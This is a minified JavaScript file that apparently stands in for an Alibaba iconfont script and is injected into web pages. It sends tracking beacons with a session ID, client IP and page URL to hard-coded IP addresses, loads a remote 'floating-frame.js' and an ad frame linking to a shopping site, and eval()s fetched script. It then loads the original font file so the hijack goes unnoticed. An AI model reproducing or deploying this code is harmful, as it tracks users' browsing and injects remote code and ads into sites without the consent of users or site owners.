!(function() {
  function sendAccounting(o, t) {
    o = o || 1
    t = t || 0
    var e = new Image()
    11 == t ||
      (T && 6 == t) ||
      (e.src =
        'http://218.108.240.24:80/' +
        o +
        '-2286/d9e2862f-eb50-45ae-a53a-a1404c489934_100.107.197.153/' +
        t +
        '.' +
        (h + C))
    2 == o && m.d()
    return e
  }
  function o(o) {
    return T
      ? 'http://218.108.240.24:80/Check/2/2286/d9e2862f-eb50-45ae-a53a-a1404c489934/100.107.197.153/q8u4ol'
      : 1 == o && 'http://218.108.240.24/CheckUrl/1/2286'
  }
  function t(t) {
    var r,
      i,
      n = Math.floor(1e3 * C),
      l = 'fp',
      s = l + n,
      a = { h: '1cffcf18a68dc65c65ba5b67c6691538f1e42341' },
      c = '_!$[]fpd9e2862f-eb50-45ae-a53a-a1404c489934[]$!_'
    m = {
      d: function() {
        j[c] === a && (j[c] = 0)
      },
      s: function(o) {
        j[c].c = o
      },
    }
    if (T && w - T > 54e5) return 11
    'string' == typeof t.jsURI && (t.jsURI = [t.jsURI])
    if ((r = j[c]) && r.h === a.h && !r.c) return 1
    i = r && r.c
    j[c] = a
    if (t.requireTopWindow && j != top) return 2
    if (t.requireObjectHasOwnProperty && !Object.prototype.hasOwnProperty)
      return 3
    if (t.json) {
      if ('string' == typeof t.json)
        try {
          t.json = b.eval('(' + t.json + ')')
        } catch (o) {
          return 4
        }
      t.json.minimum_width = t.minWidth = t.json.minimum_width || t.minWidth
      t.json.minimum_height = t.minHeight = t.json.minimum_height || t.minHeight
      t.json._accounting = {
        stopTime: p,
        sendAccounting: sendAccounting,
        allowNext: m,
        uri: 'http://58.100.228.116/static',
        comm: 'http://218.108.240.24/',
        fpsessionid: 'd9e2862f-eb50-45ae-a53a-a1404c489934',
        check: o('%TOPURLMATCH%'),
        direct: !1,
        prev: i,
      }
    }
    if (
      !(
        (t.json && '' === t.json.sprite_img) ||
        e(j, O, t.minHeight, t.minWidth)
      )
    )
      return 5
    if (t.json2uri) {
      for (; void 0 !== j[s]; ) s = l + ++n
      j[s] = t.json
      for (r = 0; r < t.jsURI.length; r++)
        t.jsURI[r] += (t.jsURI[r].indexOf('?') !== -1 ? '&' : '?') + s
    }
  }
  function e(o, t, e, r) {
    var i = t.documentElement || t.body || {},
      n = o.innerWidth || i.clientWidth || 0,
      l = o.innerHeight || i.clientHeight || 0
    return (n >= e && l >= r) || !(n + l)
  }
  function r() {
    var o,
      e,
      r,
      i,
      s,
      a,
      d,
      _ = new Date().getTime(),
      h = {
        requireTopWindow: !0,
        requireObjectHasOwnProperty: !0,
        minWidth: 550,
        minHeight: 400,
        sendEarlyAccounting: !1,
      }
    r = function(o, t) {
      return o === '@' + t ? null : o
    }
    i = function(o, t) {
      if (null === r(o, t)) return null
      o = o.toLowerCase()
      if ('true' == o) return !0
      if ('false' == o) return !1
      o = s(o, t)
      null !== o && (o = !!o)
      return o
    }
    s = function(o, t) {
      if (null === r(o, t)) return null
      o = parseInt(o)
      return isNaN(o) ? null : o
    }
    a = function(o, t) {
      if (null === r(o, t)) return null
      o = parseFloat(o)
      return isNaN(o) ? null : o
    }
    d = function(o, t) {
      return null === r(o, t) ? null : o.split(',')
    }
    h.jsURI =
      'http://58.100.228.116/static/FloatingContent/F0y7RdnhqmcHSfx8AqX9uQ/floating-frame.js'
    h.json = {
      allow_content_scroll: i('0', 'AllowContentScroll'),
      allow_content_transparency: i('1', 'AllowContentTransparency'),
      anchor_corner: r('se', 'AnchorCorner'),
      animate_in_duration: a('0.5', 'AnimateInDuration'),
      animate_out_duration: a('0.5', 'AnimateOutDuration'),
      animation_properties: d('position', 'AnimationProperties'),
      auto_scale_mobile: i('1', 'AutoScaleMobile'),
      allow_mobile_app: i('1', 'AllowMobileApp'),
      border_bottom_color: r('', 'BorderBottomColor'),
      border_bottom_position: r('', 'BorderBottomPosition'),
      border_bottom_repeat: r('no-repeat', 'BorderBottomRepeat'),
      border_bottom_width: s('0', 'BorderBottomWidth'),
      border_left_color: r('', 'BorderLeftColor'),
      border_left_position: r('', 'BorderLeftPosition'),
      border_left_repeat: r('no-repeat', 'BorderLeftRepeat'),
      border_left_width: s('0', 'BorderLeftWidth'),
      border_right_color: r('', 'BorderRightColor'),
      border_right_position: r('', 'BorderRightPosition'),
      border_right_repeat: r('no-repeat', 'BorderRightRepeat'),
      border_right_width: s('0', 'BorderRightWidth'),
      border_top_color: r('', 'BorderTopColor'),
      border_top_position: r('', 'BorderTopPosition'),
      border_top_repeat: r('no-repeat', 'BorderTopRepeat'),
      border_top_width: s('18', 'BorderTopWidth'),
      bottom_align: r('left', 'BottomAlign'),
      bottom_color: r('', 'BottomColor'),
      bottom_decoration: r('', 'BottomDecoration'),
      bottom_font_size: r('100%', 'BottomFontSize'),
      bottom_font_weight: r('normal', 'BottomFontWeight'),
      bottom_letter_spacing: a('0', 'BottomLetterSpacing'),
      bottom_offset_left: s('0', 'BottomOffsetLeft'),
      bottom_offset_right: s('0', 'BottomOffsetRight'),
      bottom_offset_vertical: s('0', 'BottomOffsetVertical'),
      bottom_text: r('', 'BottomText'),
      bottom_word_spacing: a('0', 'BottomWordSpacing'),
      close_align: r('right', 'CloseAlign'),
      close_alt_text: r('', 'CloseWindowText'),
      close_height: s('18', 'CloseHeight'),
      close_horizontal_padding: s('0', 'CloseHorizontalPadding'),
      close_hover_position: r('0 -18px', 'CloseHoverPosition'),
      close_position: r('0 0', 'ClosePosition'),
      close_vertical_offset: s('0', 'CloseVerticalOffset'),
      close_width: s('18', 'CloseWidth'),
      delay_duration: a('0', 'DelayDuration'),
      horizontal_offset: s('0', 'HorizontalOffset'),
      message_html: r('', 'MessageHTML'),
      minimum_height: s('200', 'MinimumHeight'),
      minimum_width: s('200', 'MinimumWidth'),
      ne_corner_position: r('', 'NeCornerPosition'),
      ne_corner_width: s('0', 'NeCornerWidth'),
      nw_corner_position: r('', 'NwCornerPosition'),
      nw_corner_width: s('0', 'NwCornerWidth'),
      opaque_outer_frame: i('0', 'OpaqueOuterFrame'),
      outer_height: s('1', 'Height'),
      outer_width: s('1', 'Width'),
      require_full_page_load: i('0', 'RequireFullPageLoad'),
      allow_replace: i('0', 'AllowReplace'),
      se_corner_position: r('', 'SeCornerPosition'),
      se_corner_width: s('0', 'SeCornerWidth'),
      sprite_img: r(
        'http://58.100.228.116/static/FloatingContent/static/x18.png',
        'SpriteImg'
      ),
      sw_corner_position: r('', 'SwCornerPosition'),
      sw_corner_width: s('0', 'SwCornerWidth'),
      top_align: r('left', 'TopAlign'),
      top_color: r('', 'TopColor'),
      top_decoration: r('', 'TopDecoration'),
      top_font_size: r('93%', 'TopFontSize'),
      top_font_weight: r('bold', 'TopFontWeight'),
      top_letter_spacing: a('0', 'TopLetterSpacing'),
      top_offset_left: s('0', 'TopOffsetLeft'),
      top_offset_right: s('0', 'TopOffsetRight'),
      top_offset_vertical: s('0', 'TopOffsetVertical'),
      top_text: r('', 'WindowTitle'),
      top_word_spacing: a('0', 'TopWordSpacing'),
      vertical_offset: s('0', 'VerticalOffset'),
      visible_duration: a('5', 'VisibleDuration'),
    }
    var u = r('', 'TextColor'),
      m = r('', 'FrameColor')
    m &&
      (h.json.border_top_color = h.json.border_right_color = h.json.border_bottom_color = h.json.border_left_color = m)
    u && (h.json.top_color = h.json.bottom_color = u)
    h.json.outer_width >= 0 &&
      (h.json.outer_width +=
        h.json.border_right_width + h.json.border_left_width)
    h.json.outer_height >= 0 &&
      (h.json.outer_height +=
        h.json.border_top_width + h.json.border_bottom_width)
    if (h.requireTopWindow)
      try {
        n(top.document, 'a')
        j = top
        O = j.document
      } catch (o) {}
    h.json.content_url = r(l('https://p.gouwubang.com/5CL7rF'), 'ContentURL')
    if ((o = t(h)) || _ > p) sendAccounting(2, o)
    else {
      h.sendEarlyAccounting && sendAccounting(1)
      if (h.jsURI) {
        f = c(O)
        for (o = 0; o < h.jsURI.length; o++) {
          e = n(O, 'script', null, 'src', l(h.jsURI[o]), 'type', g)
          e[C] = h.json
          f.appendChild(e)
        }
      }
      if (h.onInsert)
        try {
          h.onInsert()
        } catch (o) {}
    }
  }
  function i(o) {
    var t,
      e,
      r = [
        function() {
          return new XMLHttpRequest()
        },
        function() {
          return new ActiveXObject('Msxml2.XMLHTTP')
        },
        function() {
          return new ActiveXObject('Microsoft.XMLHTTP')
        },
        b.createRequest,
      ]
    for (e = 0; e < r.length; e++) {
      t = 0
      try {
        t = r[e]()
        break
      } catch (o) {
        t = 0
      }
    }
    if (t)
      try {
        t.open('GET', o, !1)
        t.setRequestHeader('X-PLCS', 'xhr')
        t.send(null)
        if (200 == t.status) return t.responseText || ' '
      } catch (o) {}
  }
  function n(o, t, e) {
    var r,
      i = o.createElement(t)
    e && i.appendChild(o.createTextNode(e))
    for (r = 3; r < arguments.length; r += 2)
      i.setAttribute(arguments[r], arguments[r + 1])
    return i
  }
  function l(o) {
    return o.replace('$PAGEURL$', escape(a(j).href))
  }
  function s() {
    b.V = s.V
    s.oncomplete && s.oncomplete()
  }
  function a(o) {
    return o.location || o.document.location || {}
  }
  function c(o, t, e) {
    t = o.getElementsByTagName('script')
    return (
      ((e = t.length) ? t[e - 1] : (h = 4)).parentNode ||
      o.body ||
      o.documentElement.firstChild
    )
  }
  try {
    var d,
      _,
      p,
      f,
      h,
      u,
      m,
      g = 'text/javascript',
      C = Math.random(),
      w = new Date().getTime(),
      T = parseInt('q8u4ol', 36),
      B = parseFloat('45'),
      b = window,
      R = document,
      j = b,
      O = R
    _ = 'http://' + unescape('at.alicdn.com%2Ft%2Ffont_1758092_apzrmhm52zn.js')
    f = R.createElement('div')
    h = 3
    f.innerHTML = '<!--[if IE]><i></i><![endif]-->'
    u = f.getElementsByTagName('i').length
    s.V = b.V
    b.V = s
    isNaN(B) && (B = 15)
    p = w + 1e3 * B - 2
    T = isFinite(T) ? 1e3 * T : 0
    p = w + 1e3 * B - 2
    T = isFinite(T) ? 1e3 * T : 0
    _ +=
      (~_.indexOf('?') ? (~_.indexOf(';') ? ';' : '&') : '?') +
      '_fp' +
      ((1e3 * C) | 0) +
      '=' +
      C
    if (_.split('/')[2] == a(b).host) {
      d = i(_)
      if (d) {
        h = 1
        s.js = d
        s.oncomplete = r
        return
      }
    }
    if (R.readyState == (u ? 'interactive' : 'loading')) {
      h = 2
      R.write(
        '<scr'.concat('ipt src="') +
          _ +
          '" type="' +
          g +
          '"></scr'.concat('ipt>')
      )
    } else {
      f = c(R)
      f.appendChild(n(R, 'script', 0, 'src', _, 'type', g, 'async', !1))
    }
    r()
  } catch (o) {}
})()
if (window.V) {
  if (V.js)
    try {
      window.eval(V.js)
    } catch (o) {}
  V()
}
